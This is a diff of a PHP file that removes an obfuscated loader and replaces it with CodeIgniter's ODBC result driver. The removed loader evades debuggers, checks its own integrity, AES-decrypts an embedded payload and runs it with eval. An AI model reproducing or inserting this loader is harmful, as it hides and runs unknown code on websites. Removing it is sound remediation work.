@@ -1,28 +1,238 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_methxox1=('bas'.'e64'.'_de'.'cod'.'e');
-$_w0ff5982=('gzu'.'nco'.'mpr'.'ess');
-$_mcxdj7ry=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_iu615e2m='+fknD+hJ';
-$_gzkq3c1d='IvZL7+Jd4SU=';
-$_lq8dvdfx='Q6AYD0Ta';
-$_p4oqj9zg='vBOLTAkM';
-$_zs391xjl='T5j7AW1x';
-$_unl8x304='kV69eA==';
-$_s77wejsd='fHPgot8A';
-$_qeqo4b9a='sboTU/iq';
-$_xk3z4j81=$_methxox1($_zs391xjl.$_p4oqj9zg.$_iu615e2m.$_lq8dvdfx.$_gzkq3c1d);
-$_stveo3m9=$_methxox1($_qeqo4b9a.$_s77wejsd.$_unl8x304);
-$_wtd695zz=$_methxox1('98jdW/eWQchBKNC6buvOGENS3MyC0r9PTw0JaQU5oua4rFmKfTOQ54y/LcXXUwTiB3efi6ZVk9RIl1bb3JB58htRmWLTyynmDXT7RCn5St0L/7aFFHD6jzh6pWgyf0sLyZf+2UCvC6JrEVRdaGxN5mNqEv/W+9Ahy4v3MjWLMYf7vxKfCNi0LI12mJvfkkxFQKSnOiAK6OxLnnn6SA7u8TRPrnm6OCb9f5voE3xt8INJYI2kZn8ZezHwM1KyJRbB2tBvzGBxO1/8OPbcIZspNrF8xN8TZXqxYkocRmXIwepWD3eMh8CgaXis04xLE6mRYPz6U3Z/nFUo357rJWdGriVnvaJ1Ipg+VHshla/fl6jwz/PgzSYVHPgBHHczn2K2lHFmZDlDQled2GggPZZA3BiqYBIszLglTBNt7PEiVquvIUeMmweA/Yh80fESfw0o73Rmh8aGxE5eaFv8YLOL7tCOW1G8OmTMNrFnzKML2VLmO3bIkcnSX4pt52lsNykuZ7qr9ovgRJkY5KVBQ/T43aR9h0zQdkINzywBQ9xdR8N6YQ6XrPAyBYDU5zMmNfTEtO/6yMJNwnS7UlsWbBbT38DsLNNpNwN/X/J4fJo8KIfndy/fqz501sOzezjgXh4Een3ysxQ42ea5LDTv6BxTfUvkNzlXOGslp/baASklpnbITy66ngOiwkkrjy3x5+dCiaax27aJp/rxP5DgP1SRPn28ZrUfE9jSkUyGMXIt7IquUd9bpuUS4+js4V+zvc9Y+nM0rXovnZLUAA0XTAmUEz6qDZ9zWGV3GPi//Kj/qju0yB5uSTCYJGEFCtQOfvN8ThAy0O4ng1v4b3pyYuXYZrRdasJYjhkEbmGPtP/PnzZvaypYyLYEI7RBolJYDH68RqHGrJbis5inA5tejkm1sHcdx+VipkI/ox54d7WCYF17gm7H7PwxWBhoOOsH/lWwvkVJBa7xf5t1jXLY+VVBMA==');
-$_qoisyedy=$_mcxdj7ry($_wtd695zz,'aes-256-cbc',$_xk3z4j81,OPENSSL_RAW_DATA,$_stveo3m9);
-if($_qoisyedy===false){exit;}
-$_xgmgza7e=$_w0ff5982($_qoisyedy);
-if($_xgmgza7e===false){exit;}
-$_us2feo0v='b4622e8958e2420a27ddb9458aa09dc56df4cea9abf46d131ae687d890a6465e';
-$_wagpw6tt=@file_get_contents(__FILE__);
-if($_wagpw6tt!==false){
-$_g4vfkoip=str_replace($_us2feo0v,"0000000000000000000000000000000000000000000000000000000000000000",$_wagpw6tt);
-$_v4k2jrgh=hash("sha256",$_g4vfkoip);
-if($_v4k2jrgh!==$_us2feo0v){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_odbc_result extends CI_DB_result {
+
+
+
+
+
+public function num_rows()
+{
+if (is_int($this->num_rows))
+{
+return $this->num_rows;
 }
-eval($_xgmgza7e);
+elseif (($this->num_rows = odbc_num_rows($this->result_id)) !== -1)
+{
+return $this->num_rows;
+}
+
+if (count($this->result_array) > 0)
+{
+return $this->num_rows = count($this->result_array);
+}
+elseif (count($this->result_object) > 0)
+{
+return $this->num_rows = count($this->result_object);
+}
+return $this->num_rows = count($this->result_array());
+}
+
+
+
+
+
+
+public function num_fields()
+{
+return odbc_num_fields($this->result_id);
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+$num_fields = $this->num_fields();
+if ($num_fields > 0)
+{
+for ($i = 1; $i <= $num_fields; $i++)
+{
+$field_names[] = odbc_field_name($this->result_id, $i);
+}
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($i = 0, $odbc_index = 1, $c = $this->num_fields(); $i < $c; $i++, $odbc_index++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = odbc_field_name($this->result_id, $odbc_index);
+$retval[$i]->type = odbc_field_type($this->result_id, $odbc_index);
+$retval[$i]->max_length = odbc_field_len($this->result_id, $odbc_index);
+$retval[$i]->primary_key = 0;
+$retval[$i]->default = '';
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_resource($this->result_id))
+{
+odbc_free_result($this->result_id);
+$this->result_id = FALSE;
+}
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return odbc_fetch_array($this->result_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+$row = odbc_fetch_object($this->result_id);
+if ($class_name === 'stdClass' OR ! $row)
+{
+return $row;
+}
+$class_name = new $class_name();
+foreach ($row as $key => $value)
+{
+$class_name->$key = $value;
+}
+return $class_name;
+}
+}
+
+if ( ! function_exists('odbc_fetch_array'))
+{
+
+
+
+
+
+
+
+
+
+
+function odbc_fetch_array(&$result, $rownumber = 1)
+{
+$rs = array();
+if ( ! odbc_fetch_into($result, $rs, $rownumber))
+{
+return FALSE;
+}
+$rs_assoc = array();
+foreach ($rs as $k => $v)
+{
+$field_name = odbc_field_name($result, $k+1);
+$rs_assoc[$field_name] = $v;
+}
+return $rs_assoc;
+}
+}
+
+if ( ! function_exists('odbc_fetch_object'))
+{
+
+
+
+
+
+
+
+
+
+
+function odbc_fetch_object(&$result, $rownumber = 1)
+{
+$rs = array();
+if ( ! odbc_fetch_into($result, $rs, $rownumber))
+{
+return FALSE;
+}
+$rs_object = new stdClass();
+foreach ($rs as $k => $v)
+{
+$field_name = odbc_field_name($result, $k+1);
+$rs_object->$field_name = $v;
+}
+return $rs_object;
+}
+}
